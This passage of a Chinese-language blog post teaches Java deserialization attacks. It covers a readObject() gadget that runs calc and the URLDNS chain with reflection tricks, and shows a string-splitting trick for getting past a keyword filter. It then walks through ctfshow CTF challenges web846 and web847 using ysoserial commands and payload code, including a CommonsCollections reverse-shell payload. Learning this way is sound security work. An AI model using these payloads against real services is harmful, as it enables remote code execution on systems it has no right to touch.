serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>UnserializeTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) unserialize(<span class="string">&quot;per.ser&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Person类直接重写了<code>readObject()</code>方法，造成弹计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line">    System.out.println(<span class="string">&quot;serserser&quot;</span>);</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意：<strong>这个方法是个私有方法，需要用<code>private</code>修饰</strong></p>
+<h3 id="案例2：序列化过程中的问题（以URLDNS链为例）"><a href="#案例2：序列化过程中的问题（以URLDNS链为例）" class="headerlink" title="案例2：序列化过程中的问题（以URLDNS链为例）"></a>案例2：序列化过程中的问题（以URLDNS链为例）</h3><p>看这个代码：（URLDNS链）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;AA&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://4t15g7.dnslog.cn&quot;</span>),<span class="number">1</span>); <span class="comment">// 在这一行触发了hashCode()函数。</span></span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在put的过程中，因为URL类在实例化对象的时候，其hashCode初始值为-1。这就会触发handler.hashCode()方法，然后就运行了<code>InetAddress addr = getHostAddress(u);</code>，dnslog那边就有回显。</p>
+<p>URL.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化时却无法触发。这是因为，在进行初始化时，即运行<code>HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;();</code>时，hashCode被初始化为-1。但是后面put的时候，URL的hashCode属性已经被赋值了，不是-1了，会直接运行<code>return hashCode;</code>反序列化就没法触发了。</p>
+<p>该如何改变这个问题呢？就是通过反射。<br>SerializeTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// 这里不发起请求，把url对象的hashCode改成非-1的数</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://er62vs.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>); <span class="comment">//hashCode属性原本为-1（private int hashCode = -1;），给它修改为1234。</span></span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把hashCode改回-1（通过反射）</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>UnserializeTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        unserialize(<span class="string">&quot;per.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过了在put时对url.hashCode的检查。</p>
+<p>整个的URLDNS链就是这样。<br>HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()</p>
+<h4 id="反射在反序列化漏洞中的应用"><a href="#反射在反序列化漏洞中的应用" class="headerlink" title="反射在反序列化漏洞中的应用"></a>反射在反序列化漏洞中的应用</h4><ol>
+<li>定制需要的对象；</li>
+<li>通过invoke调用除了同名函数以外的函数；</li>
+<li>通过Class类创建对象，引入不能序列化的类。(一般用于Java命令执行)<br>如，Java的命令执行一般为<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
+但是<code>Runtime</code>无法被序列化。但我们又无法通过同名函数绕过（<code>readObject()</code>的方法体里鲜少有<code>getRuntime()</code>方法）。那么思路就是找到可以利用的<code>invoke</code>方法，从而传入<code>getRuntime</code>字符串作为参数。</li>
+</ol>
+<p>小妙招：因为反射非常灵活，所以如果加入一些简单的过滤，我们可以这样绕过：<br>如，屏蔽了hashCode，这段代码会被过滤：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>但是，因为我们传入的是字符串，所以可以通过字符串的操作来绕过这个过滤。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hash&quot;</span>+<span class="string">&quot;Code&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="例题学习-ctfshow-web入门-Java反序列化"><a href="#例题学习-ctfshow-web入门-Java反序列化" class="headerlink" title="例题学习: ctfshow-web入门 Java反序列化"></a>例题学习: ctfshow-web入门 Java反序列化</h1><h2 id="web846"><a href="#web846" class="headerlink" title="web846"></a>web846</h2><p>提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctfshow会对你post提交的ctfshow参数进行base64解码</span><br><span class="line">然后进行反序列化</span><br><span class="line">构造出对当前题目地址的dns查询即可获得flag</span><br></pre></td></tr></table></figure>
+<p>URLDNS利用链。使用ysoserial来做。ysoserial最好在linux上运行，jdk弄到1.8。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS <span class="string">&quot;https://2e00f767-b3c3-44eb-9f32-5c37ef072ff8.challenge.ctf.show/&quot;</span> | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure>
+
+<p>经过r3师傅指点，知道了换行<code>-w 0</code>会对输出造成影响。这里直接取消换行，即可通过。</p>
+<p>还<a target="_blank" rel="noopener" href="https://evo1ution.cn/2023/08/26/ctfshow-web4/">从这个wp</a>偷了一个exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://82a29d49-0758-485a-927e-3d8a6b5287af.challenge.ctf.show/&quot;</span>);</span><br><span class="line">    <span class="comment">// 修改初始的hashCode，使得序列化时不会触发</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">urlfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    urlfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    urlfield.set(url,<span class="number">1234</span>);</span><br><span class="line">    hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">    urlfield.set(url,-<span class="number">1</span>);</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">    objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">    System.out.println(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="web847"><a href="#web847" class="headerlink" title="web847"></a>web847</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,要执行命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>|<span class="built_in">base64</span> </span><br></pre></td></tr></table></figure>
+<p>直接弄个反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,反弹shell的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>|<span class="built_in">base64</span> </span><br></pre></td></tr></table></figure>
+<p>试了CommonsCollections1、3，都不行，5成功了。</p>
+<p>后面尝试手写。</p>
+<h1 id="附录和一些基础知识"><a href="#附录和一些基础知识" class="headerlink" title="附录和一些基础知识"></a>附录和一些基础知识</h1><h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">Java反射介绍</a></li>
+</ul>
+<h3 id="Java-反射-概念-Powered-By-GPT"><a href="#Java-反射-概念-Powered-By-GPT" class="headerlink" title="Java 反射 概念 Powered By GPT"></a>Java 反射 概念 Powered By GPT</h3><blockquote>
+<p>Java 反射是指在运行时检查、获取和操作类、接口、字段、方法以及构造方法的能力。通过 Java 反射，你可以在运行时获取类的信息，如类名、字段、方法、注解等，并可以动态地创建对象、调用方法、访问或修改字段值，而不需要在编译时确定这些操作。</p>
+</blockquote>
+<p>Java 反射提供了以下主要功能：</p>
+<ul>
+<li>获取类信息：可以获取类的名称、修饰符、父类、实现的接口等信息。</li>
+<li>获取构造方法和实例化对象：可以获取类的构造方法并用它们来实例化对象。</li>
+<li>获取方法信息：可以获取类的方法信息，包括方法名、参数列表、返回类型等。</li>
+<li>调用方法：可以在运行时动态调用类的方法。</li>
+<li>访问和修改字段：可以在运行时访问和修改类的字段值。</li>
+<li>注解操作：可以获取类、方法、字段等上的注解信息。<br>反射是一种强大的工具，但同时也增加了复杂性和性能开销。因此，在使用反射时需要权衡其优点和缺点，并谨慎使用。</li>
+</ul>
+<h3 id="Java-反射-例子"><a href="#Java-反射-例子" class="headerlink" title="Java 反射 例子"></a>Java 反射 例子</h3><p>Person.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">printDetails</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name + <span class="string">&quot;, Age: &quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ReflectionExample.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 Person 类的 Class 对象</span></span><br><span class="line">            Class&lt;?&gt; personClass = Class.forName(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">            <span class="comment">//这是通过类名（字符串形式）来获取对应的Class对象。Class.forName(&quot;Person&quot;)方法会查找并加载Person类，并返回它的Class对象。这个步骤使得在编译时无需知道类的具体信息，而是可以在运行时动态地获取。</span></span><br><span class="line">            <span class="comment">//当然，也可以通过Person person = new Person(); Class personClass = person.getClass();来实现。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 Person 类的实例</span></span><br><span class="line">            Constructor&lt;?&gt; constructor = personClass.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">            <span class="comment">// 通过personClass.getConstructor方法，获取一个特定的构造函数。这里传入的是构造函数参数的类型列表（String.class和int.class），这个步骤用于查找匹配的构造函数。在这个例子中，我们找到了一个接受String和int参数的构造函数。</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">personInstance</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line">            <span class="comment">// 一旦获取了构造函数，我们可以通过newInstance方法创建类的实例，并传入构造函数所需的参数。在这里，我们传入了&quot;John Doe&quot;和30，分别对应Person类的构造函数参数。这一步实际上是动态地调用构造函数创建对象实例。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 访问私有字段 name</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="comment">// 在Java反射中，Field是一个类，用于表示类的字段（成员变量）。通过反射，你可以使用Field类获取、修改类的字段（包括私有字段）的值。Field类位于java.lang.reflect包中。</span></span><br><span class="line">            nameField.setAccessible(<span class="literal">true</span>);  <span class="comment">// 由于字段是私有的，需设置为可访问</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) nameField.get(personInstance);</span><br><span class="line">            System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 修改私有字段 name</span></span><br><span class="line">            <span class="comment">// 在Java反射中，通过Field类的get和set方法可以直接访问和修改对象的字段值，这是因为反射提供了一种动态访问和操作对象字段的机制。这种机制使得你可以在运行时绕过通常的访问控制（如private和protected），直接操作对象的字段。</span></span><br><span class="line">            nameField.set(personInstance, <span class="string">&quot;Jane Doe&quot;</span>);</span><br><span class="line">            name = (String) nameField.get(personInstance);</span><br><span class="line">            System.out.println(<span class="string">&quot;Updated Name: &quot;</span> + name);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用公有方法 getAge</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getAgeMethod</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="type">int</span>) getAgeMethod.invoke(personInstance);</span><br><span class="line">            System.out.println(<span class="string">&quot;Age: &quot;</span> + age);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用私有方法 printDetails</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">printDetailsMethod</span> <span class="operator">=</span> personClass.getDeclaredMethod(<span class="string">&quot;printDetails&quot;</span>);</span><br><span class="line">            printDetailsMethod.setAccessible(<span class="literal">true</span>);  <span class="comment">// 由于方法是私有的，需设置为可访问</span></span><br><span class="line">            printDetailsMethod.invoke(personInstance);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用公有方法 action</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">action</span> <span class="operator">=</span> personClass.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class); <span class="comment">// 注意声明字段类型</span></span><br><span class="line">            action.invoke(personInstance,<span class="string">&quot;adfadfa&quot;</span>); <span class="comment">//调用方法，传参</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Name: John Doe</span><br><span class="line">Updated Name: Jane Doe</span><br><span class="line">Age: 30</span><br><span class="line">Name: Jane Doe, Age: 30</span><br><span class="line">adfadfa</span><br></pre></td></tr></table></figure>
+
+<h2 id="Java-动态代理"><a href="#Java-动态代理" class="headerlink" title="Java 动态代理"></a>Java 动态代理</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/72644638">代理模式</a></p>
+<h3 id="Java-静态代理-例子"><a href="#Java-静态代理-例子" class="headerlink" title="Java 静态代理 例子"></a>Java 静态代理 例子</h3><p>首先设一个接口 IUser.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据这个接口实现一个类 UserImpl.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;直接implement&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据这个类实现一个代理类 UserProxy.java</p>
